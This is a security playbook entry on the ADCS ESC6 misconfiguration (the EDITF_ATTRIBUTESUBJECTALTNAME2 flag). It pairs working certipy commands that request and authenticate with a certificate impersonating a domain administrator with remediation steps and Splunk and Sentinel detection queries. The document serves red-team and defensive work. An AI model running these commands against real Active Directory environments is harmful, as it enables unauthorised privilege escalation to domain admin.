name: ADCS ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 Flag Abuse
description: ESC6 targets CAs where the EDITF_ATTRIBUTESUBJECTALTNAME2 flag is set. This flag allows ANY certificate requester to specify a Subject Alternative Name (SAN) in the request, regardless of template settings. Any template with enrollment rights becomes an ESC1-equivalent.
notes:
=== THE IDEA ===
If the CA has EDITF_ATTRIBUTESUBJECTALTNAME2 set, ANY enrollable
template becomes exploitable - the requester can add a SAN for
any user, bypassing template restrictions.

=== DETECT ===
  certipy find -u user@corp.local -p pass -dc-ip <dc_ip> -vulnerable
  # Look for: [!] CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag set

  # Manual check (from CA):
  certutil -config "CA01\CORP-CA" -getreg policy\EditFlags
  # Check for EDITF_ATTRIBUTESUBJECTALTNAME2 (0x00040000)

=== EXPLOIT ===
  # Request cert with SAN for administrator
  certipy req -u user@corp.local -p pass -ca CORP-CA -template User -upn administrator@corp.local

  # Authenticate
  certipy auth -pfx administrator.pfx -dc-ip <dc_ip>

=== NOTES ===
- The EDITF flag is set on the CA itself, not on templates
- ANY template with client auth EKU + enrollment rights is exploitable
- The User template is commonly available to all domain users
- Common in older ADCS deployments

=== REMEDIATION ===
  certutil -config "CA01\CORP-CA" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
  net stop certsvc && net start certsvc

examples.label: Check if EDITF flag is set
Request cert with admin SAN
examples.command: certipy req -u user@corp.local -p pass -ca CORP-CA -template User -upn administrator@corp.local

defense.why_it_works: The EDITF_ATTRIBUTESUBJECTALTNAME2 registry flag on the CA tells it to accept attacker-supplied SANs in certificate requests, regardless of what the template allows.
defense.prerequisites: CA with EDITF flag set; enrollment rights on any client-auth template.
defense.impact: Any domain user can request a certificate as any other user, including Domain Admin.
defense.detection: [MITRE T1649] Certificate requests with SANs that do not match the requester.
defense.artifacts: Event 4886/4887 (cert request/issue) with SAN different from requester.
defense.splunk_spl:
index=wineventlog EventCode=4887
| where RequesterName!=SubjectAlternativeName
| table _time, RequesterName, SubjectAlternativeName, CertificateTemplate
defense.sentinel_kql:
SecurityEvent
| where EventID == 4887
| project TimeGenerated, RequesterName, CertificateTemplate
defense.prevention: Remove EDITF_ATTRIBUTESUBJECTALTNAME2 flag; restart CA service after removal.

detections.name: ESC6 - Certificate issued with mismatched SAN
detections.logic:
SecurityEvent
| where EventID == 4887
| extend SAN = extract("SubjectAlternativeName=(.*?)(;|$)", 1, EventData)
| where isnotempty(SAN) and SAN !contains SubjectUserName
| project TimeGenerated, SubjectUserName, SAN, CertificateTemplate
detections.false_positives: Service accounts requesting certs for managed endpoints
detections.tuning: Exclude known service account patterns; focus on admin-level SAN values
